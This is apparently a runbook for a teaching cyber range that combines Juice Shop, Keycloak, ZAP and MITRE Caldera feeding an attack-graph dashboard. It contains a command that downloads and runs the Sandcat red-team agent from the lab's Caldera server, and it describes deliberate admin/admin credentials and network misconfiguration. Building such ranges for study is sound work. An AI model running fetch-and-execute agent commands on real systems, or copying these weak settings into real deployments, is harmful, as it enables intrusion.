# AEGIS Midsem Runbook

## Current State

The range is split into three zones:
- `dmz_net`: Juice Shop and ZAP
- `corp_net`: the `employee` workstation, Keycloak (IdP, realm `aegis`), and the back side of Juice Shop
- `data_net`: MySQL. The workstation is also attached here on purpose, as a flat-network misconfiguration.

The dashboard (`python -m aegis serve`) collects inventory, identities, ZAP and
Caldera reports, and validated scenarios into a temporal attack graph. It ranks
attack paths and lists findings with their reachability. MITRE Caldera is an
optional Compose profile, because rootless Podman may not be able to unpack the
official Caldera image without host UID/GID configuration changes.

## Start the Range

From `cyber_range/`:

```bash
docker compose up --build
```

Expected local services:

- Juice Shop: `http://localhost:8080`
- Keycloak: `http://localhost:8180` (lab admin `admin` / `admin`; this weak bootstrap secret is deliberate and shows up as an attack path)
- AEGIS dashboard: `http://localhost:8000`

ZAP runs inside the range for scans and does not expose a browser UI by default.

## ZAP Scan

Run this after `webapp` and `zap` are healthy:

```bash
docker exec zap zap-full-scan.py -t http://webapp:3000 -J zap-scan-SC-series.json
```

Click **Re-collect** on the dashboard (or `POST /api/collect`). `/zap/wrk` is mounted to `experiments/results`, so the
JSON report is written directly into the dashboard's input directory. The
newest `experiments/results/*zap*.json` is authoritative: alerts missing from a
rescan are closed in the temporal graph.

## Caldera Operation

Caldera is optional for the midsem demo path. To start it with Docker Engine or
a Podman setup that can unpack the official image:

```bash
docker compose --profile caldera up -d caldera
```

Then open `http://localhost:8888`.

If rootless Podman fails with an error about insufficient UIDs/GIDs, fix the host
Podman user namespace configuration (`/etc/subuid`, `/etc/subgid`, then
`podman system migrate`) or run this service with Docker Engine. The official
GHCR Caldera image can contain file ownership values that rootless Podman cannot
map on some machines.

Start Sandcat from the `employee` container:

```bash
docker exec -it employee bash -lc "curl -s -X POST http://caldera:8888/file/download -H 'file:sandcat.go' -H 'platform:linux' -o sandcat && chmod +x sandcat && ./sandcat -server http://caldera:8888 -group red"
```

In Caldera, run a safe discovery ability such as System Information Discovery
(`T1082`) against the `red` group. Export the operation report as JSON and save
it to:

```text
experiments/results/caldera-op-SC-series.json
```

The dashboard ingests Caldera reports when the filename contains `caldera`.

## Dashboard API

Without containers, run it from the repo root (see README for setup):

```bash
.venv/bin/python -m aegis serve
```

See the README for the full endpoint list. Pick an earlier time in **Graph as of**
on the dashboard to view the graph and paths as they were then.
